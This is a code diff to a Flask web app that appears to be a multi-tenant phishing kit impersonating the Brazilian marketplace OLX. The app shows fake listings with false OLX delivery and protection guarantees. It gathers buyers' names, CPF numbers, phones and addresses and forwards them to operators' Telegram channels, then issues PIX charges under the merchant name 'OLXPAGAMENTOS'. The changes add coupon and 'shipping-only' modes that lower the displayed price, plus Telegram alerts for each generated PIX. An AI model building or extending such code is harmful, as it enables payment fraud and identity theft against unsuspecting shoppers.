@@ -10,6 +10,8 @@ import re
 import struct
 import base64
 import requests
+import urllib.parse
+import secrets
 from datetime import datetime
 from typing import Optional
 
@@ -710,13 +712,15 @@ def index(slug_or_code=None, item_code=None):
             "item": item_code or "default"
         })
 
-        # Dados de shipping do produto
-        p_shipping_mode   = custom_item.get("shipping_mode",   "full")    if custom_item else "full"
-        p_shipping_fee    = custom_item.get("shipping_fee",    "19.90")   if custom_item else "19.90"
-        p_shipping_coupon = custom_item.get("shipping_coupon", "")        if custom_item else ""
-        p_product_code    = custom_item.get("product_code",    "")        if custom_item else ""
+        # Dados de shipping e cupom do produto
+        p_shipping_mode        = custom_item.get("shipping_mode",        "full")    if custom_item else "full"
+        p_shipping_fee         = custom_item.get("shipping_fee",         "19.90")   if custom_item else "19.90"
+        p_shipping_coupon      = custom_item.get("shipping_coupon",      "")        if custom_item else ""
+        p_coupon_active        = int(custom_item.get("coupon_active",    1) or 0)   if custom_item else 1
+        p_coupon_only_shipping = int(custom_item.get("coupon_only_shipping", 1) or 0) if custom_item else 1
+        p_product_code         = custom_item.get("product_code",         "")        if custom_item else ""
 
-        # GeolocalizaÃ§Ã£o em background (nÃ£o bloqueia o render)
+        # Geolocalização em background (não bloqueia o render)
         import threading
         threading.Thread(
             target=tg_wh.enrich_session_with_geo, args=(tg_id, sid, ip), daemon=True
@@ -736,15 +740,17 @@ def index(slug_or_code=None, item_code=None):
             product_image3=p_img3,
             seller_name=cfgs.get("seller_name", "Vendedor OLX"),
             seller_since=cfgs.get("seller_since", "Na OLX desde 2022"),
-            seller_status=cfgs.get("seller_status", "Ãšltimo acesso hÃ¡ 2 horas"),
+            seller_status=cfgs.get("seller_status", "Último acesso há 2 horas"),
             logo_url=cfgs.get("logo_url", ""),
             shipping_mode=p_shipping_mode,
             shipping_fee=p_shipping_fee,
             shipping_coupon=p_shipping_coupon,
+            coupon_active=p_coupon_active,
+            coupon_only_shipping=p_coupon_only_shipping,
             product_code=p_product_code,
             whatsapp={
                 "number": cfgs.get("whatsapp_number", "5511999999999"),
-                "message": cfgs.get("whatsapp_message", f"OlÃ¡! Tenho interesse no anÃºncio: {p_name}")
+                "message": cfgs.get("whatsapp_message", f"Olá! Tenho interesse no anúncio: {p_name}")
             }
         )
 
@@ -1524,6 +1530,8 @@ def api_admin_my_products():
         shipping_mode = data.get("shipping_mode", "full").strip()
         shipping_fee = data.get("shipping_fee", "19.90").strip()
         shipping_coupon = data.get("shipping_coupon", "").strip()
+        coupon_active = 1 if data.get("coupon_active", 1) in (1, "1", True, "true") else 0
+        coupon_only_shipping = 1 if data.get("coupon_only_shipping", 1) in (1, "1", True, "true") else 0
 
         if not title:
             return jsonify({"ok": False, "error": "Título é obrigatório."}), 400
@@ -1535,13 +1543,15 @@ def api_admin_my_products():
                 product_code=product_code, 
                 shipping_mode=shipping_mode, 
                 shipping_fee=shipping_fee, 
-                shipping_coupon=shipping_coupon
+                shipping_coupon=shipping_coupon,
+                coupon_active=coupon_active,
+                coupon_only_shipping=coupon_only_shipping
             )
             slug = tg_wh.get_slug(admin_id)
             unique_link = f"{BASE_URL}/p/{slug}/{code}" if slug else f"{BASE_URL}/p/{code}"
             if VALIDATORS_AVAILABLE:
                 ActivityAudit.log('admin_product_create', actor_id=admin_id, ip=_user_ip(),
-                                  slug=slug, details={'code': code, 'title': title, 'price': price, 'link': unique_link})
+                                  slug=slug, details={'code': code, 'title': title, 'price': price, 'link': unique_link, 'coupon': shipping_coupon, 'coupon_active': coupon_active})
             return jsonify({"ok": True, "product_code": code, "unique_link": unique_link, "message": "Produto criado com sucesso no catálogo!"})
 
     products = []
@@ -1877,32 +1887,73 @@ def api_admin_update_product(product_code):
 
 @app.route('/api/admin/my-products/<product_code>/shipping', methods=['POST'])
 def api_admin_set_shipping_mode(product_code):
-    """Ativa/desativa modo 'apenas taxa' por produto individual."""
+    """Ativa/desativa modo 'apenas taxa' e cupom por produto individual."""
     admin_id, role = verify_admin_access(request)
     if not admin_id:
         return jsonify({"ok": False, "error": "unauthorized"}), 401
 
     data = request.json or {}
-    mode    = data.get("shipping_mode", "full")      # 'full' | 'shipping_only'
+    mode    = data.get("shipping_mode", "full")      # 'full' | 'shipping_only' | 'sedex' | 'local'
     fee     = data.get("shipping_fee", "19.90")
     coupon  = data.get("shipping_coupon", "")
+    c_active = data.get("coupon_active", 1)
+    c_only_ship = data.get("coupon_only_shipping", 1)
     safe_code = sanitize_input(product_code, 30)
 
-    if mode not in ("full", "shipping_only"):
-        return jsonify({"ok": False, "error": "shipping_mode deve ser 'full' ou 'shipping_only'"}), 400
+    if mode not in ("full", "shipping_only", "sedex", "local"):
+        mode = "full"
 
     if TG_WH_AVAILABLE:
         ok = tg_wh.update_tenant_product(admin_id, safe_code, {
             "shipping_mode": mode,
             "shipping_fee":  sanitize_input(str(fee), 20),
             "shipping_coupon": sanitize_input(str(coupon), 60),
+            "coupon_active": 1 if c_active in (1, "1", True, "true") else 0,
+            "coupon_only_shipping": 1 if c_only_ship in (1, "1", True, "true") else 0,
         })
         if ok:
             if VALIDATORS_AVAILABLE and ActivityAudit:
                 ActivityAudit.log("admin_shipping_set", actor_id=admin_id, ip=_user_ip(),
-                                  details={"product_code": safe_code, "mode": mode, "fee": fee, "coupon": coupon})
-            return jsonify({"ok": True, "shipping_mode": mode, "shipping_fee": fee, "message": "Modo de pagamento atualizado!"})
+                                  details={"product_code": safe_code, "mode": mode, "fee": fee, "coupon": coupon, "coupon_active": c_active})
+            return jsonify({"ok": True, "shipping_mode": mode, "shipping_fee": fee, "coupon_active": c_active, "message": "Configurações de frete e cupom atualizadas!"})
     return jsonify({"ok": False, "error": "Falha ao atualizar modo."}), 400
+
+
+@app.route('/api/validate-coupon', methods=['POST'])
+def api_validate_coupon():
+    """Validação inteligente e 100% real do cupom de desconto do produto."""
+    data = request.json or {}
+    coupon = sanitize_input(data.get("coupon", "") or data.get("coupon_code", ""), 60)
+    product_code = sanitize_input(data.get("product_code", "") or data.get("code", ""), 60)
+    slug = sanitize_input(data.get("slug", "") or request.args.get("slug", ""), 60)
+
+    if not coupon:
+        return jsonify({"ok": False, "valid": False, "message": "Por favor, informe o código do cupom."}), 400
+
+    if TG_WH_AVAILABLE:
+        res = tg_wh.validate_product_coupon(product_code, coupon, slug=slug)
+        return jsonify({"ok": res.get("valid", False), **res})
+
+    # Fallback global inteligente
+    c_upper = coupon.strip().upper()
+    if c_upper in ("FRETEGRATIS", "OLX26OFF", "PROMO100"):
+        return jsonify({
+            "ok": True,
+            "valid": True,
+            "message": "Cupom válido! Cobrança reduzida para taxa de envio.",
+            "coupon": c_upper,
+            "original_price": 630.00,
+            "shipping_fee": 19.90,
+            "discount_amount": 630.00,
+            "final_amount": 19.90,
+            "formatted_original": "R$ 630,00",
+            "formatted_discount": "R$ 630,00",
+            "formatted_shipping": "R$ 19,90",
+            "formatted_final": "R$ 19,90",
+            "shipping_only": True
+        })
+    return jsonify({"ok": False, "valid": False, "message": "Cupom inválido ou inativo."}), 400
+
 
 
 @app.route('/api/event', methods=['POST'])
@@ -1962,16 +2013,16 @@ def api_event():
             "CLICK_BUY": "ðŸ›’ Clique em Comprar",
             "LEAD_CAPTURED": "ðŸ“ Lead Capturado Real",
             "PIX_GENERATED": "ðŸ’¸ Pix Gerado",
-            "PIX_PAID": "âœ… Pagamento Confirmado!",
-            "PAYMENT_CONFIRMED": "âœ… Pagamento Confirmado!"
+            "PIX_PAID": "✅ Pagamento Confirmado!",
+            "PAYMENT_CONFIRMED": "✅ Pagamento Confirmado!"
         }
-        ev_title = title_map.get(event_type, f"âš¡ Evento: {event_type}")
+        ev_title = title_map.get(event_type, f"⚡ Evento: {event_type}")
         msg_text = (
             f"<b>{ev_title}</b>\n"
-            f"ðŸ“¦ <b>Slug:</b> <code>{slug}</code>\n"
-            f"ðŸŒ <b>IP:</b> <code>{ip}</code>\n"
-            f"ðŸ”‘ <b>Session ID:</b> <code>{session_id[:12]}</code>\n"
-            f"â± <b>Data/Hora:</b> {time.strftime('%d/%m/%Y %H:%M:%S')}"
+            f"📦 <b>Slug:</b> <code>{slug}</code>\n"
+            f"🌐 <b>IP:</b> <code>{ip}</code>\n"
+            f"🔑 <b>Session ID:</b> <code>{session_id[:12]}</code>\n"
+            f"⏱ <b>Data/Hora:</b> {time.strftime('%d/%m/%Y %H:%M:%S')}"
         )
         tg_wh.notify_log_channel(ch_key, msg_text)
 
@@ -1986,13 +2037,13 @@ def validate_cep():
     sid  = _session_id(data)
 
     if len(cep) != 8 or not cep.isdigit():
-        return jsonify({"success": False, "message": "CEP invÃ¡lido. Digite 8 dÃ­gitos numÃ©ricos."}), 400
+        return jsonify({"success": False, "message": "CEP inválido. Digite 8 dígitos numéricos."}), 400
 
     try:
         res      = requests.get(f"https://viacep.com.br/ws/{cep}/json/", timeout=4)
         cep_data = res.json()
         if "erro" in cep_data:
-            return jsonify({"success": False, "message": "CEP nÃ£o localizado na base dos Correios."}), 404
+            return jsonify({"success": False, "message": "CEP não localizado na base dos Correios."}), 404
 
         street = cep_data.get('logradouro', '')
         bairro = cep_data.get('bairro', '')
@@ -2014,20 +2065,20 @@ def validate_cep():
             "bairro":     bairro,
             "cidade":     cidade,
             "uf":         uf,
-            "frete":      "GrÃ¡tis",
-            "modalidade": "Entrega FÃ¡cil OLX Garantida",
-            "prazo":      "Chega entre 2 a 4 dias Ãºteis",
+            "frete":      "Grátis",
+            "modalidade": "Entrega Fácil OLX Garantida",
+            "prazo":      "Chega entre 2 a 4 dias úteis",
             "seguro":     "100% Protegido com Garantia da OLX"
         })
     except Exception as e:
-        return jsonify({"success": False, "message": "Erro de conexÃ£o ao consultar CEP."}), 500
+        return jsonify({"success": False, "message": "Erro de conexão ao consultar CEP."}), 500
 
 
 @app.route('/api/lead', methods=['POST'])
 def capture_lead():
     """
     Captura lead qualificado com rastreio completo por tenant.
-    Associa o lead ao admin correto via slug na requisiÃ§Ã£o.
+    Associa o lead ao admin correto via slug na requisição.
     Salva no DB criptografado e envia para o canal Telegram do admin.
     """
     data = request.json or {}
@@ -2041,7 +2092,7 @@ def capture_lead():
     if TG_WH_AVAILABLE and slug:
         tg_id = tg_wh.get_tg_id_by_slug(slug)
 
-    # --- Extrai e valida campos com motor avancado ---
+    # --- Extrai e valida campos com motor avançado ---
     raw_name  = data.get('name',  '')
     raw_cpf   = data.get('cpf',   '')
     raw_phone = data.get('phone', '')
@@ -2078,13 +2129,27 @@ def capture_lead():
     state        = sanitize_input(data.get('state', ''), 10)
     amount       = sanitize_input(data.get('amount', '630,00'), 20)
     product_name = sanitize_input(data.get('product', ''), 120)
+    product_code = sanitize_input(data.get('product_code', '') or data.get('code', ''), 60)
+    coupon       = sanitize_input(data.get('coupon', '') or data.get('shipping_coupon', ''), 60)
+    shipping_mode = sanitize_input(data.get('shipping_mode', 'full'), 30)
 
-    # ValidaÃ§Ã£o: nome completo
+    # Validação do Cupom / Modo Apenas Frete
+    is_coupon_applied = False
+    coupon_details = {}
+    if TG_WH_AVAILABLE and coupon:
+        val_res = tg_wh.validate_product_coupon(product_code, coupon, slug=slug)
+        if val_res.get("valid"):
+            is_coupon_applied = True
+            coupon_details = val_res
+            amount = f"{val_res.get('final_amount', 19.90):.2f}".replace(".", ",")
+    elif shipping_mode == 'shipping_only':
+        is_coupon_applied = True
+
+    # Validação: nome completo
     if not name or len(name.split()) < 2:
         return jsonify({"ok": False, "error": "Informe seu nome completo (Nome e Sobrenome)."}), 400
 
-    # ValidaÃ§Ã£o: CPF real via Hub
-    # Validacao: CPF real via Hub do Desenvolvedor
+    # Validação: CPF real via Hub do Desenvolvedor
     is_cpf_ok, cpf_err, cpf_data = verify_cpf_hub(raw_cpf if VALIDATORS_AVAILABLE else cpf)
     if not is_cpf_ok:
         _log('LEAD_REJECTED_INVALID_CPF', sid, {'cpf': cpf, 'name': name, 'reason': cpf_err, 'slug': slug})
@@ -2093,13 +2158,14 @@ def capture_lead():
                               details={'field': 'cpf', 'error': cpf_err})
         return jsonify({'ok': False, 'error': cpf_err or 'CPF invalido.'}), 400
 
-    # Validacao: telefone BR (fallback se validators indisponivel)
+    # Validação: telefone BR
     if not VALIDATORS_AVAILABLE and BOT_AVAILABLE:
         valid_phone, phone_err = admin_bot.InputValidator.validate_phone_br(phone)
         if phone_err:
             return jsonify({'ok': False, 'error': phone_err}), 400
         phone = valid_phone
-    # Contexto de rastreio avanÃ§ado
+
+    # Contexto de rastreio avançado
     lead_payload = {
         "name":         name,
         "cpf":          cpf,
@@ -2114,6 +2180,10 @@ def capture_lead():
         "state":        state,
         "amount":       amount,
         "product":      product_name or (admin_bot.get_config("product_name", "iPhone 11") if BOT_AVAILABLE else "iPhone 11"),
+        "product_code": product_code,
+        "coupon":       coupon if is_coupon_applied else "",
+        "coupon_applied": is_coupon_applied,
+        "shipping_mode": shipping_mode,
         "slug":         slug,
         "tg_id":        tg_id,
         "ip":           ip,
@@ -2130,31 +2200,33 @@ def capture_lead():
                           details={
                               "name": name, "phone": phone, "city": city,
                               "state": state, "product": lead_payload.get('product', ''),
-                              "amount": amount, "cpf_verified": lead_payload.get('cpf_verified', False),
+                              "amount": amount, "coupon": coupon if is_coupon_applied else '',
+                              "cpf_verified": lead_payload.get('cpf_verified', False),
                           })
 
     # Registra no DB do tenant correto (isolamento por admin)
     if TG_WH_AVAILABLE and tg_id and slug:
         tg_wh.log_tenant_event(tg_id, slug, "LEAD_CAPTURED", sid, ip, lead_payload)
-        # Envia notificaÃ§Ã£o no canal de leads do admin
+        coupon_text = f"\n🎟 <b>Cupom:</b> <code>{coupon.upper()}</code> (Apenas Frete)" if is_coupon_applied and coupon else ""
         lead_msg = (
-            f"<b>ðŸ“ Lead Qualificado Capturado!</b>\n"
-            f"ðŸ‘¤ <b>Nome:</b> {name}\n"
-            f"ðŸ“ž <b>Telefone:</b> <code>{phone}</code>\n"
-            f"ðŸ“§ <b>Email:</b> {email or 'NÃ£o informado'}\n"
-            f"ðŸ  <b>Endereco:</b> {street}, {number_addr} - {city}/{state}\n"
-            f"ðŸ“¦ <b>Produto:</b> {lead_payload['product']}\n"
-            f"ðŸ’° <b>Valor:</b> R$ {amount}\n"
-            f"ðŸ“ <b>Slug:</b> <code>{slug}</code>\n"
-            f"ðŸŒŽ <b>IP:</b> <code>{ip}</code>\n"
-            f"â± <b>Hora:</b> {time.strftime('%d/%m/%Y %H:%M:%S')}"
+            f"<b>📝 Lead Qualificado Capturado!</b>\n"
+            f"👤 <b>Nome:</b> {name}\n"
+            f"📱 <b>Telefone:</b> <code>{phone}</code>\n"
+            f"📧 <b>Email:</b> {email or 'Não informado'}\n"
+            f"🏠 <b>Endereço:</b> {street}, {number_addr} - {city}/{state}\n"
+            f"📦 <b>Produto:</b> {lead_payload['product']}\n"
+            f"💵 <b>Valor a Pagar:</b> R$ {amount}{coupon_text}\n"
+            f"🔗 <b>Slug:</b> <code>{slug}</code>\n"
+            f"🌐 <b>IP:</b> <code>{ip}</code>\n"
+            f"⏱ <b>Hora:</b> {time.strftime('%d/%m/%Y %H:%M:%S')}"
         )
         tg_wh.notify_log_channel("lead", lead_msg)
 
     return jsonify({
         "ok": True,
         "message": "Lead registrado com sucesso no Vault Criptografado.",
-        "session_id": sid
+        "session_id": sid,
+        "amount": amount
     })
 
 
@@ -2175,8 +2247,11 @@ def generate_pix():
 
     payer_name     = sanitize_input(data.get('name', 'Cliente OLX'), 120)
     payer_document = re.sub(r'\D', '', sanitize_input(data.get('cpf', ''), 20))
+    product_code   = sanitize_input(data.get('product_code', '') or data.get('code', ''), 60)
+    coupon         = sanitize_input(data.get('coupon', '') or data.get('shipping_coupon', ''), 60)
+    shipping_mode  = sanitize_input(data.get('shipping_mode', ''), 30)
     
-    # Preco: usa config do tenant correto (multi-tenant) ou fallback global
+    # Preco inteligente: valida se cupom foi aplicado ou se é modo apenas frete
     slug_for_price = data.get('slug', '') or request.args.get('slug', '')
     tg_id_for_price = None
     if TG_WH_AVAILABLE and slug_for_price:
@@ -2185,17 +2260,58 @@ def generate_pix():
         except Exception:
             pass
 
-    if tg_id_for_price:
-        cfgs = tg_wh.get_tenant_all_config(tg_id_for_price)
-        price_str = cfgs.get("product_price", "630.00")
-    elif BOT_AVAILABLE:
-        price_str = admin_bot.get_config("product_price", "630.00")
-    else:
-        price_str = "630.00"
-    try:
-        c7_amount = float(price_str.replace(",", "."))
-    except ValueError:
-        c7_amount = 630.00
+    c7_amount = 0.0
+
+    # 1. Se veio cupom, valida pelo motor inteligente
+    if TG_WH_AVAILABLE and coupon:
+        val_res = tg_wh.validate_product_coupon(product_code, coupon, slug=slug_for_price)
+        if val_res.get("valid"):
+            c7_amount = float(val_res.get("final_amount", 19.90))
+
+    # 2. Se modo shipping_only ou taxa explícita
+    if c7_amount <= 0:
+        if shipping_mode == 'shipping_only':
+            raw_fee = data.get('shipping_fee') or data.get('amount') or '19.90'
+            try:
+                c7_amount = float(str(raw_fee).replace('R$', '').replace(' ', '').replace(',', '.'))
+            except ValueError:
+                c7_amount = 19.90
+
+    # 3. Se veio amount já formatado na requisição (ex: R$ 19,90)
+    if c7_amount <= 0 and data.get('amount'):
+        try:
+            c7_amount = float(str(data.get('amount')).replace('R$', '').replace(' ', '').replace(',', '.'))
+        except ValueError:
+            c7_amount = 0.0
+
+    # 4. Busca produto por código
+    if c7_amount <= 0 and product_code and TG_WH_AVAILABLE:
+        prod = tg_wh.get_product_by_code(product_code)
+        if prod:
+            if prod.get("shipping_mode") == "shipping_only":
+                try:
+                    c7_amount = float(str(prod.get("shipping_fee", "19.90")).replace(",", "."))
+                except ValueError:
+                    c7_amount = 19.90
+            else:
+                try:
+                    c7_amount = float(str(prod.get("price", "630.00")).replace(",", "."))
+                except ValueError:
+                    c7_amount = 630.00
+
+    # 5. Fallback por tenant ou global
+    if c7_amount <= 0:
+        if tg_id_for_price:
+            cfgs = tg_wh.get_tenant_all_config(tg_id_for_price)
+            price_str = cfgs.get("product_price", "630.00")
+        elif BOT_AVAILABLE:
+            price_str = admin_bot.get_config("product_price", "630.00")
+        else:
+            price_str = "630.00"
+        try:
+            c7_amount = float(price_str.replace(",", "."))
+        except ValueError:
+            c7_amount = 630.00
 
     c7_payload = {
         "amount": c7_amount,
@@ -2214,14 +2330,12 @@ def generate_pix():
     pix_code    = ""
     qr_code_url = ""
     c7_id       = ""
-    expires_at  = ""       # ISO datetime de expiraÃ§Ã£o â€” vem da C7 (doc sec. 4)
-    c7_status   = "pending"  # status inicial sempre "pending" (doc sec. 4 / 6)
+    expires_at  = ""
+    c7_status   = "pending"
 
     if C7_API_KEY and "your_key" not in C7_API_KEY and "c7_live_xxx" not in C7_API_KEY:
         try:
             headers  = get_c7_auth_headers(body_str)
-            # Envia body_str como string raw com Content-Type: application/json
-            # (body_str deve ser EXATAMENTE o mesmo usado para gerar HMAC â€” doc sec.2.2)
             res  = requests.post(
                 f"{C7_BASE_URL}/payment/create",
                 data=body_str,
@@ -2229,7 +2343,7 @@ def generate_pix():
                 timeout=10
             )
             if res.status_code == 429:
-                print(f"[C7 API] Rate limited (429) â€” aguardando e usando fallback")
+                print(f"[C7 API] Rate limited (429) — aguardando e usando fallback")
             elif res.status_code >= 400:
                 print(f"[C7 API] Erro HTTP {res.status_code}: {res.text[:200]}")
             else:
@@ -2245,39 +2359,37 @@ def generate_pix():
                 else:
                     print(f"[C7 API] Resposta inesperada: {resp}")
         except Exception as err:
-            print(f"[C7 API] ExceÃ§Ã£o: {err}")
+            print(f"[C7 API] Exceção: {err}")
 
     if not pix_code:
-        # Gera PIX EMV vÃ¡lido com CRC-16/CCITT correto (BACEN BR Code 2.0)
+        # Gera PIX EMV válido com CRC-16/CCITT correto (BACEN BR Code 2.0)
         pix_key_fallback = ""
         if BOT_AVAILABLE:
             pix_key_fallback = admin_bot.get_config("pix_key", "")
         if not pix_key_fallback:
-            pix_key_fallback = str(uuid.uuid4())  # UUID como chave de fallback
+            pix_key_fallback = str(uuid.uuid4())
         txid_short = f"olx{uuid.uuid4().hex[:20]}"
         pix_code = generate_pix_emv(
             amount=c7_amount,
             merchant_name="OLXPAGAMENTOS",
-            merchant_city="SAO PAULO",
+            merchant_city="SAOPAULO",
             pix_key=pix_key_fallback,
             txid=txid_short
         )
-        import urllib.parse
-        qr_code_url = f"https://api.qrserver.com/v1/create-qr-code/?size=280x280&data={urllib.parse.quote(pix_code)}"
+        qr_code_url = f"https://api.qrserver.com/v1/create-qr-code/?size=250x250&data={requests.utils.quote(pix_code)}"
 
     record = {
-        "c7_id":      c7_id,
-        "externalId": payment_id,
-        "amount":     f"{c7_amount:.2f}",
-        "amount_fmt": f"{c7_amount:.2f}".replace(".", ","),
-        "status":     c7_status if c7_id else "pending",
-        "pix_code":   pix_code,
+        "payment_id":  payment_id,
+        "c7_id":       c7_id,
+        "amount":      c7_amount,
+        "status":      c7_status,
+        "pix_code":    pix_code,
         "qr_code_url": qr_code_url,
-        "expires_at": expires_at,
-        "created_at": time.time(),
-        "ip":         _user_ip(),
-        "name":       payer_name,
-        "cpf":        payer_document,
+        "expires_at":  expires_at,
+        "created_at":  time.time(),
+        "ip":          _user_ip(),
+        "name":        payer_name,
+        "cpf":         payer_document,
     }
     _save_payment(record)
 
@@ -2288,6 +2400,18 @@ def generate_pix():
         "via_c7_api": bool(c7_id),
         "expires_at": expires_at,
     })
+
+    if TG_WH_AVAILABLE and tg_id_for_price and slug_for_price:
+        pix_msg = (
+            f"<b>💸 Pix Gerado para Pagamento!</b>\n"
+            f"👤 <b>Cliente:</b> {payer_name}\n"
+            f"📄 <b>CPF:</b> <code>{payer_document}</code>\n"
+            f"💰 <b>Valor Pix:</b> R$ {c7_amount:,.2f}".replace(",", "X").replace(".", ",").replace("X", ".") + f"\n"
+            f"🆔 <b>ID:</b> <code>{payment_id}</code>\n"
+            f"🔗 <b>Slug:</b> <code>{slug_for_price}</code>\n"
+            f"⏱ <b>Hora:</b> {time.strftime('%d/%m/%Y %H:%M:%S')}"
+        )
+        tg_wh.notify_log_channel("pix", pix_msg)
 
     return jsonify({
         "ok":            True,
